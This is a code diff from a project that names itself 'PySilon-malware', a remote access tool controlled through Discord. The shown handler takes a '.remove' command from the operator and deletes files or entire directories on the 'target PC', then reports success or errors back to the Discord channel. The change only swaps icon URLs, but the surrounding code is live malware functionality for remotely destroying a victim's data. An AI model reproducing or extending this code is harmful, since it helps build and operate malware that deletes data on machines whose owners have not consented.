@@ -13,7 +13,7 @@ elif message.content[:7] == '.remove':
         if message.content.strip() == '.remove':
             #.log Author issued empty .remove 
             embed = discord.Embed(title="📛 Error",description=f'```Syntax: .remove <file-or-directory>```', colour=discord.Colour.red())
-            embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
             #.log Sent embed with usage of .remove 
         else:
@@ -27,24 +27,24 @@ elif message.content[:7] == '.remove':
                         rmtree('/'.join(working_directory) + '/' + message.content[8:])
                         #.log Removed a directory 
                     embed = discord.Embed(title="🟢 Success",description=f'```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```', colour=discord.Colour.green())
-                    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                     reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                     #.log Sent embed about removal 
                 except Exception as error:
                     #.log Error occurred while trying to remove a file/directory 
                     embed = discord.Embed(title="📛 Error",description=f'`' + str(error) + '`', colour=discord.Colour.red())
-                    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                     reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                     #.log Sent embed with information about this error 
             else:
                 #.log File/Directory requested by Author does not exist on this PC 
                 embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
-                embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                 reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                 #.log Sent embed about missing file/directory 
     else:
         #.log Message channel is not file-related 
         embed = discord.Embed(title="📛 Error",description=f'||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
-        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
         #.log Sent embed about wrong channel 
